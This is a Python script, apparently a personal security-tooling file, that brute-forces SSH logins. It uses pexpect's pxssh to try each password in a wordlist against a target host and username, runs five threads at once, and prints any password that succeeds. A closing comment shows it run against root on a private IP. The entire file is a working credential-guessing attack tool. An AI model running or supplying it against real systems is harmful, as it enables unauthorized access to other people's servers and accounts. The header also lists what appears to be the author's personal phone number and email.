# -*- coding:utf-8 -*-
# /usr/bin/python
'''
-------------------------------------------------
   File Name   :  ssh_brute
   Description :  main: 暴力破解ssh密码
                  Functions: 1. 
                             2. 
   Functions   :
   Envs        :  python == 3.55
                  pip install  
   Date        :  2021/3/2  上午11:13
   CodeStyle   :  规范,简洁,易懂,可阅读,可维护,可移植!
-------------------------------------------------
   Change Activity:
          2021/3/2 : tag
-------------------------------------------------
__Author__ = "Yan Errol 13075851954"
__Email__ = "260187357@qq.com"
__Copyright__ = "Copyright 2021, Yan Errol"
-------------------------------------------------
'''

from pexpect import pxssh
import argparse
import time
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0


def connect(host, user, password, release=True):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser(
        usage='python3 ssh_brute.py TARGET_HOST -u USERNAME -f PASSWD_FILE')
    parser.add_argument('tgt_host', type=str, metavar='TARGET_HOST',
                        help="specify target host's IP address")
    parser.add_argument('-u', type=str, metavar='USERNAME', required=True,
                        help='specify the user name')
    parser.add_argument('-f', type=str, metavar='PASSWD_FILE', required=True,
                        help='specify password file name')

    args = parser.parse_args()
    host = args.tgt_host
    passwd_file = args.f
    user = args.u

    with open(passwd_file) as file:
        for line in file.readlines():
            if Found:
                print("[*] Exiting: Password Found")
                exit(0)
                if Fails > 5:
                    print("[!] Exiting: Too Many Socket Timeouts")
                    exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print("[-] Testing: " + str(password))
            t = threading.Thread(target=connect,
                                 args=(host, user, password))
            t.start()


if __name__ == '__main__':
    main()

'''
$  python ssh_brute.py 10.10.1.36 -u root -f pass.txt
'''